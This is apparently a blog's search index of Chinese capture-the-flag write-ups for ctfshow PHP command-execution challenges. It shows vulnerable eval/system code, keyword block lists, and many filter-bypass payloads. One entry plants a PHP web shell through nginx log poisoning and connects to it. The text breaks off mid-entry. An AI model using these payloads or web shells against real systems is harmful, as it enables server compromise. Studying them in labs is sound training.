<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow web53-57 命令执行</title>
      <link href="/2026/02/21/ctfshow-web53-57/"/>
      <url>/2026/02/21/ctfshow-web53-57/</url>
      
        <content type="html"><![CDATA[<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.$d;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多了几段代码，没有影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$d = system($c);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;.$d;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;nl${IFS}fl\ag.php</p></blockquote><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很强力的过滤，前面的方法不能用了</p><ul><li>比如 <code>.*c.*a.*t.*</code>，意味着只要匹配到cat就会被过滤，如c122321at，cslhat。</li></ul><p>ls没被过滤，先看一下目录</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260221195319145.png" alt="image-20260221170915705"></p><p>flag就在当前目录下，省去了寻找的麻烦</p><p>我们前面的payload是， ?c&#x3D;ca&#x2F;t${IFS}fla&#x2F;g.php</p><p>虽然ca\t或ca’’t不能用，但是我们可以通过绝对路径来调取命令（<code>/bin/cat</code>），不过需要加上通配符<code>?</code>，即 <code>/bin/ca?</code> 。</p><p>flag也要改成，f???.php</p><blockquote><p>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}f???.php</p></blockquote><p>然后查看网页源代码</p><p>或者使用grep</p><ul><li><code>grep</code>: Linux 强大的文本搜索工具。它的基本语法是 <code>grep [可选参数] [内容] [文件]</code>。</li></ul><p>可以这样用<code>grep$&#123;IFS&#125;\&#123;$&#123;IFS&#125;f???????</code> 或者<code>?c=grep$&#123;IFS&#125;&#39;fla&#39;$&#123;IFS&#125;fla?.php</code></p><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web42-52</title>
      <link href="/2026/01/20/ctfshow-web42-52/"/>
      <url>/2026/01/20/ctfshow-web42-52/</url>
      
        <content type="html"><![CDATA[<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>&gt;&#x2F;dev&#x2F;null</strong>: 将标准输出（stdout）重定向到“黑洞”设备，即不显示任何正常结果。</p></li><li><p><strong>2&gt;&amp;1</strong>: 将标准错误（stderr）也重定向到标准输出，由于标准输出已经进了黑洞，意味着错误信息也不会显示。</p></li></ul><p>所以我们只需用 <strong>;</strong> ，将后面重定向的部分截断</p><blockquote><p>?c&#x3D;tac flag.php;</p></blockquote><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了分号和cat;</p><p>同时要把system里的&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1截断，可以用|| ， &amp; ， &amp;&amp;</p><blockquote><p>?c&#x3D;tac fla* ||</p></blockquote><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;tac fla* ||</p></blockquote><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了空格，可以使用制表符%09</p><blockquote><p>?c&#x3D;tac%09fla*||</p></blockquote><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对数字也做了过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=tac&lt;fl\ag.php||</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">?c=tac&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><p><code>&lt;</code>：是输入重定向符 </p><p><code>\</code>：是转义符，执行时 <code>fl\ag</code> 等同于 <code>flag</code>。</p><p><code>&#39;&#39;</code>：相邻的引号会被忽略</p><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> ?c&#x3D;tac&lt;fl\ag.php||</p></blockquote><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;tac&lt;fl\ag.php||</p></blockquote><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;tac&lt;fl\ag.php||</p></blockquote><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;tac&lt;fl\ag.php||</p></blockquote><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了tac，跟flag一样，用 \ 绕过，或者使用 nl</p><blockquote><p>?c&#x3D;ta\c&lt;fl\ag.php||</p></blockquote><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能使用重定向符了，那还可以使用${IFS}</p><ul><li><strong>${IFS}</strong>: 这是一个 Shell 环境变量（Internal Field Separator），默认包含空格、制表符和换行符。在过滤了空格的情况下，常用于替代空格来分隔命令参数。</li></ul><blockquote><p>?c&#x3D;ta\c${IFS}fl\ag.php||</p></blockquote><p>访问结果不是真正的flag，还要我们继续找</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260220194705142.png" alt="image-20260220170820988"></p><p>先看一下根目录</p><blockquote><p>?c&#x3D;ls${IFS}&#x2F;||</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260220194705143.png" alt="image-20260220171057386"></p><p>有个flag目录，访问后就得到flag了</p><blockquote><p>?c&#x3D;ta\c${IFS}&#x2F;fl\ag||</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web29-41 命令执行</title>
      <link href="/2026/01/18/ctfshow-web29-41/"/>
      <url>/2026/01/18/ctfshow-web29-41/</url>
      
        <content type="html"><![CDATA[<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;system(ls);</p></blockquote><p>得知flag.php</p><p>题目过滤了flag，所以用通配符*来读取</p><blockquote><p>?c&#x3D;system(‘tac f*’);</p></blockquote><p>这道题解法也是五花八门，还可以：</p><ol><li>?c&#x3D;echo`tac f*`; （两个反引号的作用是执行命令并返回字符串，但要用echo才能看到回显）</li><li>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘tac f*’);</li><li>?c&#x3D;system(“cp fl*g.php a.txt”); （用cp将flag拷贝成a.txt，然后再访问a.txt即可）</li></ol><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题再在上一题基础上，多禁用了system，php</p><blockquote><p>?c&#x3D;echo`tac%20f*`;</p></blockquote><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%09是制表符</p><blockquote><p>?c&#x3D;echo`tac%09f*`;</p></blockquote><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>这题把常见的指令都禁用掉了，但是可以用include。</li></ol><p>利用参数中转绕过过滤，再用伪协议读一下目录</p><blockquote><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls');?></p></blockquote><p><code>?&gt;</code>：PHP 的结束标签。因为分号被过滤了，所以使用这个来替代</p><p>得知flag.php</p><blockquote><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac flag.php');?></p></blockquote><p>或者</p><blockquote><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><p>以base64输出，解码一下就得到了flag</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260120031453249.png" alt="image-20260120022358796"></p><ol start="2"><li>还可以利用日志注入方法</li></ol><p>通过插件知道使用的是Nginx服务，所以日志文件在var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260120031453250.png" alt="image-20260120022507624"></p><blockquote><p>?c&#x3D;include%22$_GET[a]%22?%3E&amp;a&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p></blockquote><p>访问的时候将ua改成<?php @eval($_POST['cmd']); ?></p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260120031453251.png" alt="image-20260120023526907"></p><p>打开蚁剑就能连上了</p><p><img src="https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20260120031453252.png" alt="image-20260120023643993"></p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然没过滤include，同上题。</p><blockquote><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac flag.php');?></p></blockquote><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧同上</p><blockquote><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac flag.php');?></p></blockquote><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac flag.php');?></p></blockquote><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span 